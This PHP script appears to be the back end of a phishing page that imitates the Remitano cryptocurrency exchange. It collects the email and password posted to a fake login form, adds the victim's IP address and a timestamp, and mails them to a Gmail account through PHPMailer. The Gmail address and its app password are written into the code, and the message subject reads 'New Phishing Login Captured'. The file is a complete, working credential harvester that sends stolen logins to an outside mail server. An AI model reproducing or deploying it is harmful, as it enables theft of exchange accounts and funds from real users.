<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'vendor/PHPMailer/src/Exception.php';
require 'vendor/PHPMailer/src/PHPMailer.php';
require 'vendor/PHPMailer/src/SMTP.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? 'no-email';
    $password = $_POST['password'] ?? 'no-password';
    $ip = $_SERVER['REMOTE_ADDR'];
    $timestamp = date("Y-m-d H:i:s");

    $message = "Captured Remitano Credentials:\n\n";
    $message .= "Email: $email\n";
    $message .= "Password: $password\n";
    $message .= "IP Address: $ip\n";
    $message .= "Time: $timestamp\n";

    $mail = new PHPMailer(true);

    try {
        // Server settings
        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com';
        $mail->SMTPAuth   = true;
        $mail->Username   = 'mwananchihuslerloans2@gmail.com'; // Your Gmail
        $mail->Password   = 'mokasgadsaacljec'; // Your app password
        $mail->SMTPSecure = 'tls';
        $mail->Port       = 587;

        // Recipients
        $mail->setFrom('mwananchihuslerloans2@gmail.com', 'Phishing Demo');
        $mail->addAddress('mwananchihuslerloans2@gmail.com');

        // Content
        $mail->isHTML(false);
        $mail->Subject = '🎯 New Phishing Login Captured';
        $mail->Body    = $message;

        $mail->send();
        echo 'Success';
    } catch (Exception $e) {
        echo "Mailer Error: {$mail->ErrorInfo}";
    }
}
